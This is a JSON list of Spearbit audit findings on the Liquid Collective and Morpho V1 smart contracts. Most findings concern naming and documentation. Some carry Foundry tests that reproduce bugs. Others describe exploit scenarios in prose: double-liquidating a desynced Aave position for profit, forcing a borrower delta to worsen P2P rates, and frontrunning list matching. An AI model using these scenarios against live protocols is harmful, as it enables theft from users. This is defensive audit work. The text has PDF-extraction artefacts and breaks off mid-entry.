[{"title": "CoverageFund - Checks-Effects-Interactions best practice is violated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "We were not able to find any concrete instances of harmful reentrancy attack vectors in this contract, but it's recommended to follow the Checks-effects-interactions pattern anyway.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "River contract allows setting an empty metadata URI", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The current implementation of River.setMetadataURI and MetadataURI.set both allow the current value of the metadata URI to be updated to an empty string.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider requiring that the _cliffDuration is a multiple of _period", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "When a vesting schedule is created via _createVestingSchedule, the only check made on _period parameter (other than being greater than zero) is that the _duration must be a multiple of _period. If after the _cliffDuration the user can already release the matured vested tokens, it could make sense to also require that _cliffDuration % _period == 0", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Add documentation about the scenario where a vesting schedule can be created in the past", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "In the current implementation of ERC20VestableVotesUpgradeable _createVestingSchedule func- tion, there is no check for the _start value. This means that the creator of a vesting schedule could create a schedule that starts in the past. Allowing the creation of a vesting schedule with a past _start also influences the behavior of _revokeVestingSchedule (see ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked).", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The current implementation of _createVestingSchedule allows the creation of vesting schedules that  Start in the past: _start < block.timestamp.  Have already ended: _start + _duration < block.timestamp. Because of this behavior, in case of the creation of a past vesting schedule that has already ended  The _beneficiary can instantly call (if there's no lock period) releaseVestingSchedule to release the whole amount of tokens.  The creator of the vesting schedule cannot call revokeVestingSchedule because the new end would be in the past and the transaction would revert with an InvalidRevokedVestingScheduleEnd error. The second scenario is particularly important because it does not allow the creator to reduce the length or remove the schedule entirely in case the schedule has been created mistakenly or with a misconfiguration (too many token vested, lock period too long, etc...).", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "getVestingSchedule returns misleading information if the vesting token creator revokes the sched- ule", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The getVestingSchedule function returns the information about the created vesting schedule. The duration represents the number of seconds of the vesting period and the amount represents the number of tokens that have been scheduled to be released after the period end (or after lockDuration if it has been configured to be greater than end). If the creator of the vesting schedule calls revokeVestingSchedule, only the end of the vesting schedule struct will be updated. If external contracts or dApps rely only on the getVestingSchedule information there could be scenarios where they display or base their logic on wrong information. Consider the following example. Alluvial creates a vesting schedule for alice with the following config 18 { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true This means that after 10 days, Alice would own in her balance 10 TLC tokens. If Alluvial calls revokeVestingSchedule before the cliff period ends, all of the tokens will be returned to Alluvial but the getVestingSchedule function would still display the same information with just the end attribute updated. An external dApp or contract that does not check the new end and compares it to cliffDuration, lockDura- tion, and period but only uses the amount would display the wrong number of vested tokens for Alice at a given timestamp.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule. This function returns the value returned by _computeVestedAmount that relies on duration and amount while the only attribute changed by revokeVestingSchedule is the end. 19 function _computeVestedAmount(VestingSchedules.VestingSchedule memory _vestingSchedule, uint256 _time) internal pure returns (uint256) { if (_time < _vestingSchedule.start + _vestingSchedule.cliffDuration) { // pre-cliff no tokens have been vested return 0; } else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) { // post vesting all tokens have been vested return _vestingSchedule.amount; } else { uint256 timeFromStart = _time - _vestingSchedule.start; // compute tokens vested for completly elapsed periods uint256 vestedDuration = timeFromStart - (timeFromStart % _vestingSchedule.period); return (vestedDuration * _vestingSchedule.amount) / _vestingSchedule.duration; } } If the creator revokes the schedule, the computeVestingVestedAmount would return more tokens compared to the amount that the user has vested in reality. Consider the following example. Alluvial creates a vesting schedule with the following config { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true Alluvial then calls revokeVestingSchedule(0, uint64(block.timestamp + 5 days));. The effect of this trans- action would return 5 tokens to Alluvial and set the new end to block.timestamp + 5 days. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + 7 days), it would return 7 because _computeVestedAmount would execute the code in the else branch. But alice cannot have more than 5 vested tokens because of the previous revoke. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + duration)it would return 10 because _computeVestedAmount would execute the code in the else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) branch. But alice cannot have more than 5 vested tokens because of the previous revoke. Attached test below to reproduce it: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { 20 function __computeVestingReleasableAmount(uint256 vestingID, uint256 _time) external view returns (uint256) { ,! return _computeVestingReleasableAmount( VestingSchedules.get(vestingID), _deterministicVestingEscrow(vestingID), _time ); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal creator; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); creator = makeAddr(\"creator\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testIncorrectComputeVestingVestedAmount() public { vm.prank(initAccount); tlc.transfer(creator, 10); // create a vesting schedule for Alice vm.prank(creator); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); // creator call revokeVestingSchedule revoking the vested schedule setting the new end as half ,! of the duration // 5 tokens are returned to the creator and `end` is updated to the new value // this means also that at max alice will have 5 token vested (and releasable) vm.prank(creator); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 5 days)); // We warp at day 7 of the schedule vm.warp(block.timestamp + 7 days); 21 // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 7); // We warp at day 10 (we reached the total duration of the vesting) vm.warp(block.timestamp + 3 days); // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 10); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider writing clear documentation on how the voting power and delegation works", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "ERC20VotesUpgradeable contract. As the official OpenZeppelin documentation says (also reported in the Alluvial's natspec contract): ERC20VestableVotesUpgradeableV1 extension The an of is By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked. Because of how ERC20VotesUpgradeable behaves on voting power and delegation of voting power could be coun- terintuitive for normal users who are not aware of it, Alluvial should be very explicit on how users should act when a vesting schedule is created for them. When a Vote Token is transferred, ERC20VotesUpgradeable calls the hook _afterTokenTransfer function _afterTokenTransfer( address from, address to, uint256 amount ) internal virtual override { super._afterTokenTransfer(from, to, amount); _moveVotingPower(delegates(from), delegates(to), amount); } In this case, _moveVotingPower(delegates(from), delegates(to), amount); will decrease the voting power of delegates(from) by amount and will increase the voting power of delegates(to) by amount. This applies if some conditions are true, but you can see them here function _moveVotingPower( address src, address dst, uint256 amount ) private { if (src != dst && amount > 0) { if (src != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[src], _subtract, ,! amount); emit DelegateVotesChanged(src, oldWeight, newWeight); } if (dst != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[dst], _add, amount); emit DelegateVotesChanged(dst, oldWeight, newWeight); } } } When a vesting schedule is created, the creator has two options: 1) Specify a custom delegatee different from the beneficiary (or equal to it, but it's the same as option 2). 2) Leave the delegatee empty (equal to address(0)).  Scenario 1) empty delegatee OR delegatee === beneficiary (same thing) After creating the vesting schedule, the voting power of the beneficiary will be equal to the amount of tokens vested. If the beneficiary did not call tlc.delegate(beneficiary) previously, after releasing some tokens, its voting power will be decreased by the amount of released tokens. 23  Scenario 2) delegatee !== beneficiary && delegatee !== address(0) Same thing as before, but now we have two different actors, one is the beneficiary and another one is the delegatee of the voting power of the vested tokens. If the beneficiary did not call tlc.delegate(vestingScheduleDelegatee) previously, after releasing some to- kens, the voting power of the current vested schedule's delegatee will be decreased by the amount of released tokens.  Related test for scenario 1 //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testLosingPowerAfterRelease() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: false }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); assertEq(tlc.getVotes(alice), 10); 24 assertEq(tlc.balanceOf(alice), 0); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); tlc.releaseVestingSchedule(0); // Alice now owns the vested tokens just released but her voting power has decreased by the ,! amount released assertEq(tlc.getVotes(alice), 9); assertEq(tlc.balanceOf(alice), 1); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Fix mismatch between revert error message and code behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The error message requires the schedule duration to be greater than the cliff duration, but the code allows it to be greater than or equal to the cliff duration.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Improve documentation and naming of period variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Similar to Consider renaming period to periodDuration to be more descriptive, the variable name and documentation are ambiguous. We can give a more descriptive name to the variable and fix the documenta- tion.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider renaming period to periodDuration to be more descriptive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "period can be confused as (for example) a counter or an id.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider removing coverageFunds variable and explicitly initialize executionLayerFees to zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Inside the OracleManager.setConsensusLayerData the coverageFunds variable is declared but never used. Consider cleaning the code by removing the unused variable. The executionLayerFees variable instead should be explicitly initialized to zero to not rely on compiler assump- tions.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider renaming IVestingScheduleManagerV1 interface to IERC20VestableVotesUpgradeableV1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The IVestingScheduleManager interface contains all ERC20VestableVotesUpgradeableV1 needs to implement and use. the events, errors, and functions that Because there's no corresponding VestingScheduleManager contract implementation, it would make sense to rename the interface to IERC20VestableVotesUpgradeableV1.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider renaming CoverageFundAddress COVERAGE_FUND_ADDRESS to be consistent with the current naming convention", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Consider renaming the constant used to access the unstructured storage slot COVERAGE_FUND_- ADDRESS. To follow the naming convention already adopted across all the contracts, the variable should be renamed to COVERAGE_FUND_ADDRESS_SLOT.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider reverting if the msg.value is zero in CoverageFundV1.donate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "In the current implementation of CoverageFundV1.donate there is no check on the msg.value value. Because of this, the sender can \"spam\" the function and emit multiple useless Donate events.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider having a separate function in River contract that allows CoverageFundV1 to send funds instead of using the same function used by ELFeeRecipientV1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "When the River contract calls the CoverageFundV1 contract to pull funds, the CoverageFundV1 sends funds to River by calling IRiverV1(payable(river)).sendELFees{value: amount}();. sendELFees is a function that is currently used by both CoverageFundV1 and ELFeeRecipientV1. function sendELFees() external payable { if (msg.sender != ELFeeRecipientAddress.get() && msg.sender != CoverageFundAddress.get()) { revert LibErrors.Unauthorized(msg.sender); } } It would be cleaner to have a separate function callable only by the CoverageFundV1 contract.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Extensively document how the Coverage Funds contract works", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The Coverage Fund contract has a crucial role inside the Protocol, and the current contract's docu- mentation does not properly cover all the needed aspects. Consider documenting the following aspects:  General explanation of the Coverage Funds and it's purpose.  Will donations happen only after a slash/penalty event? Or is there a \"budget\" that will be dumped on the contract regardless of any slashing events?  If a donation of XXX ETH is made, how is it handled? In a single transaction or distributed over a period of time?  Explain carefully that when ETH is donated, no shares are minted.  Explain all the possible market repercussions of the integration of Coverage Funds.  Is there any off-chain validation process before donating? 29  Who are the entities that are enabled to donate to the fund?  How is the Coverage Funds integrated inside the current Alluvial protocol?  Any additional information useful for the users, investors, and other actors that interact with the protocol.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Missing/wrong natspec comment and typos", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": " Natspec  Missing part of the natspec comment for /// @notice Attempt to revoke at a relative to InvalidRevokedVestingScheduleEnd in IVestingScheduleManager  Natspec missing the @return part for getVestingSchedule in IVestingScheduleManager.  Wrong order of natspec @param for createVestingSchedule in IVestingScheduleManager. The @param _beneficiary should be placed before @param _delegatee to follow the function signature order.  Natspec missing the @return part for delegateVestingEscrow in IVestingScheduleManager.  Wrong natspec comment, operators should be replaced with vesting schedules for @custom:attribute of struct SlotVestingSchedule in VestingSchedules. 30  Wrong natspec parameter, replace operator with vesting schedule in the VestingSchedules.push func- tion.  Missing @return natspec for _delegateVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _deterministicVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _getCurrentTime in ERC20VestableVotesUpgradeable.  Add the Coverage Funds as a source of \"extra funds\" in the Oracle._pushToRiver natspec documentation in Oracle.  Update the InvalidCall natspec in ICoverageFundV1 given that the error is thrown also in the receive() external payable function of CoverageFundV1.  Update the natspec of struct VestingSchedule lockDuration attribute in VestingSchedules by explaining that the lock duration of a vesting schedule could possibly exceed the overall duration of the vesting.  Update the natspec of lockDuration in ERC20VestableVotesUpgradeable by explaining that the lock dura- tion of a vesting schedule could possibly exceed the overall duration of the vesting.  Consider making the natspec documentation of struct VestingSchedule in VestingSchedules and the natspec in ERC20VestableVotesUpgradeable be in sync.  Add more examples (variations) to the natspec documentation of the vesting schedules example in ERC20VestableVotesUpgradeable to explain all the possible combination of scenarios.  Make the ERC20VestableVotesUpgradeable natspec documentation about the vesting schedule consis- tent with the natspec documentation of _createVestingSchedule and VestingSchedules struct Vest- ingSchedule.  Typos  Replace all Overriden instances with Overridden in River.  Replace transfer with transfers in ERC20VestableVotesUpgradeable.1.sol#L147.  Replace token with tokens in ERC20VestableVotesUpgradeable.1.sol#L156.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Different behavior between River _pullELFees and _pullCoverageFunds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Both _pullELFees and _pullCoverageFunds implement the same functionality:  Pull funds from a contract address.  Update the balance storage variable.  Emit an event.  Return the amount of balance collected from the contract. The _pullCoverageFunds differs from the _pullELFees implementation by avoiding both updating the Balance- ToDeposit when collectedCoverageFunds == 0 and emitting the PulledCoverageFunds event. Because they are implementing the same functionality, they should follow the same behavior if there is not an explicit reason to not do so. 31", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Move local mask variable from Allowlist.1.sol to LibAllowlistMasks.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "LibAllowlistMasks.sol is meant to contain all mask values, but DENY_MASK is a local variable in the Allowlist.1.sol contract.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider adding additional parameters to the existing events to improve filtering/monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Some already defined events could be improved by adding more parameters to better track those events in dApps or monitoring tools.  Consider adding address indexed delegatee as an event's parameter to event CreatedVestingSchedule. While it's true that after the vest/lock period the beneficiary will be the owner of those tokens, in the meanwhile (if _delegatee != address(0)) the voting power of all those vested tokens are delegated to the _delegatee.  Consider adding address indexed beneficiary to event ReleasedVestingSchedule.  Consider adding uint256 newEnd to event RevokedVestingSchedule to track the updated end of the vesting schedule.  Consider adding address indexed beneficiary to event DelegatedVestingEscrow. If those events parameters are added to the events, the Alluvial team should also remember to update the relative natspec documentation.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Missing indexed keyword in events parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Some events parameters are missing the indexed keyword. Indexing specific parameters is partic- ularly important to later be able to filter those events both in dApps or monitoring tools.  coverageFund event parameter should be declared as indexed in event SetCoverageFund.  Both oldDelegatee and newDelegatee should be indexed in event DelegatedVestingEscrow.  donator should be declared as indexed in event Donate.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Add natspec documentation to the TLC contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The current implementation of TLC contract is missing natspec at the root level to explain the contract. The natspec should cover the basic explanation of the contract (like it has already been done in other contracts like River.sol) but also illustrate  TLC token has a fixed max supply that is minted at deploy time.  All the minted tokens are sent to a single account at deploy time.  How TLC token will be distributed.  How voting power works (you have to delegate to yourself to gain voting power).  How the vesting process works.  Other general information useful for the user/investor that receives the TLC token directly or vested.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Liquidating Morpho's Aave position leads to state desync", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Morpho has a single position on Aave that encompasses all of Morpho's individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desyncs from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. It's also possible to double-liquidate for a profit. Example: There's a single borrower B1 on Morpho who is connected to the Aave pool. B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho The ETH price crashes and the position becomes liquidatable. A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit. This repaid debt / removed collateral is not synced with Morpho. The user's supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave. The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus. The state remains desynced.", "labels": ["Spearbit", "MorphoV1", "Severity: High Risk"]}, {"title": "A market could be deprecated but still prevent liquidators to liquidate borrowers if isLiquidateBor- rowPaused is true", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Currently, when a market must be deprecated, Morpho checks that borrowing has been paused before applying the new value for the flag. function setIsDeprecated(address _poolToken, bool _isDeprecated) external onlyOwner isMarketCreated(_poolToken) { } if (!marketPauseStatus[_poolToken].isBorrowPaused) revert BorrowNotPaused(); marketPauseStatus[_poolToken].isDeprecated = _isDeprecated; emit IsDeprecatedSet(_poolToken, _isDeprecated); The same check should be done in isLiquidateBorrowPaused, allowing the deprecation of a market only if isLiq- uidateBorrowPaused == false otherwise liquidators would not be able to liquidate borrowers on a deprecated market.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "setIsPausedForAllMarkets bypass the check done in setIsBorrowPaused and allow resuming borrow on a deprecated market", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The MorphoGovernance contract allow Morpho to set the isBorrowPaused to false only if the market is not deprecated. function setIsBorrowPaused(address _poolToken, bool _isPaused) external onlyOwner isMarketCreated(_poolToken) { } if (!_isPaused && marketPauseStatus[_poolToken].isDeprecated) revert MarketIsDeprecated(); marketPauseStatus[_poolToken].isBorrowPaused = _isPaused; emit IsBorrowPausedSet(_poolToken, _isPaused); This check is not enforced by the _setPauseStatus function, called by setIsPausedForAllMarkets allowing Mor- pho to resume borrowing for deprecated market. Test to reproduce the issue // SPDX-License-Identifier: AGPL-3.0-only pragma solidity ^0.8.0; import \"./setup/TestSetup.sol\"; contract TestSpearbit is TestSetup { using WadRayMath for uint256; function testBorrowPauseCheckSkipped() public { // Deprecate a market morpho.setIsBorrowPaused(aDai, true); morpho.setIsDeprecated(aDai, true); checkPauseEquality(aDai, true, true); // you cannot resume the borrowing if the market is deprecated hevm.expectRevert(abi.encodeWithSignature(\"MarketIsDeprecated()\")); morpho.setIsBorrowPaused(aDai, false); checkPauseEquality(aDai, true, true); // but this check is skipped if I call directly `setIsPausedForAllMarkets` morpho.setIsPausedForAllMarkets(false); // this should revert because // you cannot resume borrowing for a deprecated market checkPauseEquality(aDai, false, true); } function checkPauseEquality( address aToken, bool shouldBePaused, 6 bool shouldBeDeprecated ) public { ( bool isSupplyPaused, bool isBorrowPaused, bool isWithdrawPaused, bool isRepayPaused, bool isLiquidateCollateralPaused, bool isLiquidateBorrowPaused, bool isDeprecated ) = morpho.marketPauseStatus(aToken); assertEq(isBorrowPaused, shouldBePaused); assertEq(isDeprecated, shouldBeDeprecated); } }", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "User withdrawals can fail if Morpho position is close to liquidation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If the Morpho position on Aave's debt / collateral value is higher than the market's max LTV ratio but lower than the market's liquidation threshold, the borrow will fail and the position can also not be liquidated. The withdrawals could fail.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "P2P borrowers' rate can be reduced", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Users on the pool currently earn a much worse rate than users with P2P credit lines. There's a queue for being connected P2P. As this queue could not be fully processed in a single transaction the protocol introduces the concept of a max iteration count and a borrower/supplier \"delta\" (c.f. yellow paper). This delta leads to a worse rate for existing P2P users. An attacker can force a delta to be introduced, leading to worse rates than before. Example: Imagine some borrowers are matched P2P (earning a low borrow rate), and many are still on the pool and therefore in the pool queue (earning a worse borrow rate from Aave).  An attacker supplies a huge amount, creating a P2P credit line for every borrower. (They can repeat this step several times if the max iterations limit is reached.) 7  The attacker immediately withdraws the supplied amount again. The protocol now attempts to demote the borrowers and reconnect them to the pool. But the algorithm performs a \"hard withdraw\" as the last step if it reaches the max iteration limit, creating a borrower delta. These are funds borrowed from the pool (at a higher borrowing rate) that are still wrongly recorded to be in a P2P position for some borrowers. This increase in borrowing rate is socialized equally among all P2P borrowers. (reflected in an updated p2pBorrowRate as the shareOfDelta increased.)  The initial P2P borrowers earn a worse rate than before. If the borrower delta is large, it's close to the on-pool rate.  If an attacker-controlled borrower account was newly matched P2P and not properly reconnected to the pool (in the \"demote borrowers\" step of the algorithm), they will earn a better P2P rate than the on-pool rate they earned before.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk Original"]}, {"title": "Frontrunners can exploit system by not allowing head of DLL to match in P2P", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "For a given asset x, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x whenever there is a new transaction in the mempool to borrow 100 units of x,  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will put the frontrunner on the head (assuming very high gas is supplied).  Borrower's transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a block's time period.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Differences between Morpho and Compound borrow validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between them;  Compound has a mechanism to prevent borrows if the new borrowed amount would go above the current borrowCaps[cToken] threshold. Morpho does not check this threshold and could allow users to borrow on the P2P side (avoiding the revert because it would not trigger the underlying compound borrow action). Morpho should anyway monitor the borrowCaps of the market because it could make increaseP2PDeltasLogic and _unsafeWithdrawLogic reverts.  Both Morpho and Compound do not check if a market is in \"deprecated\" state. This means that as soon as a user borrows some tokens, he/she can be instantly liquidated by another user.  If the flag is true on Compound, the Morpho User can be liquidated directly on compound.  If the flag is true on Morpho, the borrower can be liquidated on Morpho.  Morpho does not check if borrowGuardianPaused[cToken] on Compound, a user could be able to borrow in P2P while the cToken market has borrow paused. More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Compound\".", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Users can continue to borrow from a deprecated market", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When a market is being marked as deprecated, there is no verification that the borrow for that market has already been disabled. This means a user could borrow from this market and immediately be eligible to be liquidated.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "ERC20 with transfer's fee are not handled by *PositionManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Some ERC20 tokens could have fees attached to the transfer event, while others could enable them in the future (see USDT, USDC). The current implementation of both PositionManager (for Aave and Compound) is not taking into consideration these types of ERC20 tokens. While Aave seems not to take into consideration this behavior (see LendingPool.sol), Compound, on the other hand, is explicitly handling it inside the doTransferIn function. Morpho is taking for 